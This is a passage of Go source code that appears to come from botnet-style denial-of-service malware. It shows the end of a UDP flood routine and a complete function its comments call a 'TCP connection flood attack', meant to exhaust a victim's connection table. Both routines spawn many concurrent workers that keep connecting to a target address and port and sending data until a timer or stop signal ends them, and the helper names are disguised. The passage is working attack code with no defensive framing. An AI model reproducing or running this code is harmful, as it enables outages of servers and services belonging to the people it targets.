	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	payload := make([]byte, 1024)
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write(payload)
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

// gengar performs a TCP connection flood attack.
// Opens TCP connections and sends minimal HTTP-like data.
// Targets connection table exhaustion on the victim.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
func gengar(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}
